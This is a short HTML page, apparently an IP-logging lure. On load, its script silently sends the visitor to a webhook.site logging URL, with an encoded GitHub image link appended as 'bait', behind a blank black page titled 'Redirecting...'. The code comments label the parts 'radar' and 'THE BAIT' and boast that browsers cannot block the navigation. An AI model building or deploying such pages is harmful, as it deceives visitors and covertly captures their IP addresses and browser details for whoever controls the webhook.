<!DOCTYPE html>
<html>
<head>
    <title>Redirecting...</title>
    <script>
        function startChain() {
            // YOUR WEBHOOK URL
            const radar = "https://webhook.site/8447f537-1f81-4106-885a-dc4c3809223e";
            // THE BAIT
            const bait = "https://github.com/bluekama/project-portfolio/blob/main/IMG_0542.PNG?raw=true";

            // We force the browser to actually "visit" the webhook URL for a split second
            // This is impossible for a browser to block because it's a direct navigation
            window.location.href = radar + "?redirect=" + btoa(bait);
        }
        window.onload = startChain;
    </script>
</head>
<body style="background-color: black;">
</body>
</html>
